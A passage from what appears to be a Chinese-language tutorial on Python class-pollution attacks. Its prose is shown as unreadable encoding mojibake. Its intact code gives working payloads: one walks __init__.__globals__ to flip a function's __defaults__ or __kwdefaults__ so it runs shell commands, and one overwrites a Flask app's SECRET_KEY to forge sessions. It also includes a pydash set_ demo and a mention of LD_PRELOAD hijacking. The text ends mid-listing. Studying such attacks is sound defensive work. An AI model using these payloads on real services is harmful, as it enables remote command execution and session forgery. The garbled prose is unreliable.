</div><p><code>__spec__</code>ÂÜÖÁΩÆÂ±ûÊÄßÂú®<code>Python 3.4</code>ÁâàÊú¨ÂºïÂÖ•ÔºåÂÖ∂ÂåÖÂê´‰∫ÜÂÖ≥‰∫éÁ±ªÂä†ËΩΩÊó∂ÁöÑ‰ø°ÊÅØÔºåÊú¨Ë∫´ÊòØÂÆö‰πâÂú®<code>Lib/importlib/_bootstrap.py</code>ÁöÑÁ±ª<code>ModuleSpec</code>ÔºåÊòæÁÑ∂Âõ†‰∏∫ÂÆö‰πâÂú®<code>importlib</code>Ê®°Âùó‰∏ãÁöÑ<code>py</code>Êñá‰ª∂ÔºåÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•ÈááÁî®<code>&lt;Ê®°ÂùóÂêç&gt;.__spec__.__init__.__globals__['sys']</code>Ëé∑ÂèñÂà∞<code>sys</code>Ê®°Âùó</p>
<p>Áî±‰∫é<code>ModuleSpec</code>ÁöÑÂ±ûÊÄßÂÄºËÆæÁΩÆÔºåÁõ∏ÂØπ‰∫é‰∏äÈù¢ÁöÑËé∑ÂèñÊñπÂºèÔºåËøòÊúâ‰∏ÄÁßçÁõ∏ÂØπÈïøÁöÑ<code>payload</code>ÁöÑËé∑ÂèñÊñπÂºèÔºå‰∏ªË¶ÅÊòØÂà©Áî®<code>ModuleSpec</code>‰∏≠ÁöÑ<code>loader</code>Â±ûÊÄß„ÄÇÂ¶ÇÂ±ûÊÄßÂêçÊâÄÁ§∫ÔºåËØ•Â±ûÊÄßÁöÑÂÄºÊòØÊ®°ÂùóÂä†ËΩΩÊó∂ÊâÄÁî®ÁöÑ<code>loader</code></p>
<p>ÊâÄ‰ª•ÊúâËøôÊ†∑ÁöÑÁõ∏ÂØπÈïøÁöÑ<code>Payload</code>Ôºö<code>&lt;Ê®°ÂùóÂêç&gt;.__spec__.loader.__init__.__globals__['sys']</code></p>
<h4 id="ÂÆûÈôÖÁéØÂ¢É‰∏≠ÁöÑÂêàÂπ∂ÂáΩÊï∞">ÂÆûÈôÖÁéØÂ¢É‰∏≠ÁöÑÂêàÂπ∂ÂáΩÊï∞
</h4><p>ÁõÆÂâçÂèëÁé∞‰∫Ü<code>Pydash</code>Ê®°Âùó‰∏≠ÁöÑ<code>set_</code>Âíå<code>set_with</code>ÂáΩÊï∞ÂÖ∑ÊúâÂ¶Ç‰∏äÂÆû‰æã‰∏≠<code>merge</code>ÂáΩÊï∞Á±ª‰ººÁöÑÁ±ªÂ±ûÊÄßËµãÂÄºÈÄªËæëÔºåËÉΩÂ§üÂÆûÁé∞Ê±°ÊüìÊîªÂáª„ÄÇ</p>
<p>‰æãÂ¶Ç‰∏ãÈù¢Ëøô‰∏™‰æãÂ≠ê</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pydash</span> <span class="kn">import</span> <span class="n">set_</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Father</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">secret_value</span> <span class="o">=</span> <span class="s2">&#34;safe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pollution</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pollutant</span> <span class="o">=</span> <span class="n">Pollution</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">father</span> <span class="o">=</span> <span class="n">Father</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;key&#34;</span> <span class="p">:</span> <span class="s2">&#34;__class__.__init__.__globals__.father.secret_value&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;value&#34;</span> <span class="p">:</span> <span class="s2">&#34;polluted&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="s2">&#34;key&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">value</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="s2">&#34;value&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">father</span><span class="o">.</span><span class="n">secret_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#safe</span>
</span></span><span class="line"><span class="cl"><span class="n">set_</span><span class="p">(</span><span class="n">pollutant</span><span class="p">,</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">father</span><span class="o">.</span><span class="n">secret_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#polluted</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÊîªÂáªÈù¢ÊãìÂ±ï">ÊîªÂáªÈù¢ÊãìÂ±ï
</h2><h3 id="ÂáΩÊï∞ÂΩ¢ÂèÇÈªòËÆ§ÂÄºÊõøÊç¢">ÂáΩÊï∞ÂΩ¢ÂèÇÈªòËÆ§ÂÄºÊõøÊç¢
</h3><p>‰∏ªË¶ÅÁî®Âà∞‰∫ÜÂáΩÊï∞ÁöÑ<code>__defaults__</code>Âíå<code>__kwdefaults__</code>Ëøô‰∏§‰∏™ÂÜÖÁΩÆÂ±ûÊÄß</p>
<h4 id="__defaults__"><code>__defaults__</code>
</h4><p><code>__defaults__</code>‰ª•ÂÖÉÁªÑÁöÑÂΩ¢ÂºèÊåâ‰ªéÂ∑¶Âà∞Âè≥ÁöÑÈ°∫Â∫èÊî∂ÂΩï‰∫ÜÂáΩÊï∞ÁöÑ‰ΩçÁΩÆÊàñÈîÆÂÄºÂΩ¢ÂèÇÁöÑÈªòËÆ§ÂÄºÔºåÈúÄË¶ÅÊ≥®ÊÑèËøô‰∏™‰ΩçÁΩÆÊàñÈîÆÂÄºÂΩ¢ÂèÇÊòØÁâπÂÆöÁöÑ‰∏ÄÁ±ªÂΩ¢ÂèÇÔºåÂπ∂‰∏çÊòØ‰ΩçÁΩÆÂΩ¢ÂèÇ+ÈîÆÂÄºÂΩ¢ÂèÇ,ÂΩìÊàë‰ª¨ÂéªÂÆö‰πâ‰∏Ä‰∏™ÂáΩÊï∞Êó∂ÔºåÂèØ‰ª•‰∏∫ÂÖ∂‰∏≠ÁöÑÂèÇÊï∞ÊåáÂÆöÈªòËÆ§ÂÄº„ÄÇËøô‰∫õÈªòËÆ§ÂÄº‰ºöË¢´Â≠òÂÇ®Âú®<code>__defaults__</code>ÂÖÉÁªÑ‰∏≠„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">a</span><span class="p">(</span><span class="n">var_1</span><span class="p">,</span> <span class="n">var_2</span> <span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">var_3</span> <span class="o">=</span> <span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="vm">__defaults__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#(2, 3)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÈÄöËøáÊõøÊç¢ËØ•Â±ûÊÄß‰æøËÉΩÂÆûÁé∞ÂØπÂáΩÊï∞‰ΩçÁΩÆÊàñÈîÆÂÄºÂΩ¢ÂèÇÁöÑÈªòËÆ§ÂÄºÊõøÊç¢Ôºå‰ΩÜÁ®çÊúâÈóÆÈ¢òÁöÑÊòØËØ•Â±ûÊÄßÂÄºË¶ÅÊ±Ç‰∏∫ÂÖÉÁªÑÁ±ªÂûãÔºåËÄåÈÄöÂ∏∏ÁöÑÂ¶Ç<code>JSON</code>Á≠âÊ†ºÂºèÂπ∂Ê≤°ÊúâÂÖÉÁªÑËøô‰∏ÄÊï∞ÊçÆÁ±ªÂûãËÆæËÆ°Ê¶ÇÂøµÔºåËøôÂ∞±ÈúÄË¶ÅÁéØÂ¢É‰∏≠ÊúâÂêàÈÄÇÁöÑËß£ÊûêËæìÂÖ•ÁöÑÊñπÂºè</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">evilFunc</span><span class="p">(</span><span class="n">arg_1</span> <span class="p">,</span> <span class="n">shell</span> <span class="o">=</span> <span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">shell</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">arg_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">arg_1</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;evilFunc&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;__defaults__&#34;</span> <span class="p">:</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="kc">True</span> <span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">evilFunc</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#whoami</span>
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">evilFunc</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#article-kelp</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="__kwdefaults__"><code>__kwdefaults__</code>
</h4><p><code>__kwdefaults__</code>‰ª•Â≠óÂÖ∏ÁöÑÂΩ¢ÂºèÊåâ‰ªéÂ∑¶Âà∞Âè≥ÁöÑÈ°∫Â∫èÊî∂ÂΩï‰∫ÜÂáΩÊï∞ÈîÆÂÄºÂΩ¢ÂèÇÁöÑÈªòËÆ§ÂÄº</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;evilFunc&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;__kwdefaults__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;shell&#34;</span> <span class="p">:</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ÁâπÂÆöÂÄºÊõøÊç¢">ÁâπÂÆöÂÄºÊõøÊç¢
</h3><h4 id="osenvironËµãÂÄº"><code>os.environ</code>ËµãÂÄº
</h4><p>ÂèØ‰ª•ÂÆûÁé∞Â§öÁßçÂà©Áî®ÊñπÂºèÔºåÂ¶Ç<code>NCTF2022</code>‰∏≠<code>calc</code>ËÄÉÁÇπÂØπ<code>os.system</code>ÁöÑÂà©Áî®ÔºåÁªìÂêà<code>LD_PRELOAD</code>‰∏éÊñá‰ª∂‰∏ä‰º†<code>.so</code>ÂÆûÁé∞Âä´ÊåÅÁ≠â</p>
<h4 id="flaskÁõ∏ÂÖ≥Â±ûÊÄß"><code>flask</code>Áõ∏ÂÖ≥Â±ûÊÄß
</h4><h5 id="secret_key"><code>SECRET_KEY</code>
</h5><p>Â¶ÇÊûúÊàë‰ª¨ÂèØ‰ª•ÂØπÂØÜÈí•ËøõË°åÊõøÊç¢ÔºåËµãÂÄº‰∏∫Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ËøõË°å‰ªªÊÑèÁöÑsession‰º™ÈÄ†ÔºåËøôÈáåÂõ†‰∏∫secret_keyÊòØÂú®ÂΩìÂâçÂÖ•Âè£Êñá‰ª∂‰∏ãÈù¢ÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÈÄöËøá<code>__init__.__globals__</code>Ëé∑ÂèñÂÖ®Â±ÄÂèòÈáèÔºåÁÑ∂ÂêéÈÄöËøáapp.config[&ldquo;SECRET_KEY&rdquo;]Êù•ËøõË°åÊ±°Êüì</p>
<p>ÁªôÂá∫Á§∫ËåÉÁéØÂ¢É</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;[+]Config:</span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;app&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;config&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;SECRET_KEY&#34;</span> <span class="p">:</span><span class="s2">&#34;Polluted~&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="_got_first_request">_got_first_request
</h5><p>Áî®‰∫éÂà§ÂÆöÊòØÂê¶ÊüêÊ¨°ËØ∑Ê±Ç‰∏∫Ëá™<code>Flask</code>ÂêØÂä®ÂêéÁ¨¨‰∏ÄÊ¨°ËØ∑Ê±ÇÔºåÊòØ<code>Flask.got_first_request</code>ÂáΩÊï∞ÁöÑËøîÂõûÂÄºÔºåÊ≠§Â§ñËøò‰ºöÂΩ±ÂìçË£ÖÈ•∞Âô®<code>app.before_first_request</code>ÁöÑË∞ÉÁî®Ôºå‰æùÊçÆÊ∫êÁ†ÅÂèØ‰ª•Áü•ÈÅì<code>_got_first_request</code>ÂÄº‰∏∫ÂÅáÊó∂Êâç‰ºöË∞ÉÁî®</p>
<p>ÊâÄ‰ª•Â¶ÇÊûúÊàë‰ª¨ÊÉ≥Ë∞ÉÁî®Á¨¨‰∏ÄÊ¨°ËÆøÈóÆÂâçÁöÑËØ∑Ê±ÇÔºåËøòÊÉ≥Ë¶ÅÂú®ÂêéÁª≠ËØ∑Ê±Ç‰∏≠ËøõË°å‰ΩøÁî®ÁöÑËØùÔºåÊàë‰ª¨Â∞±ÈúÄË¶ÅÂ∞Ü_got_first_request‰ªétrueÊîπÊàêfalseÁÑ∂ÂêéÂ∞±ËÉΩÂ§üÂú®ÂêéÁª≠ËÆøÈóÆÁöÑËøáÁ®ã‰∏≠Ôºå‰ªçÁÑ∂ËÉΩÂ§üË∞ÉÁî®Ë£ÖÈ•∞Âô®app.before_first_request‰∏ãÈù¢ÁöÑÂèØÁî®‰ø°ÊÅØ„ÄÇ</p>
<p>Á§∫ËåÉÁéØÂ¢É</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
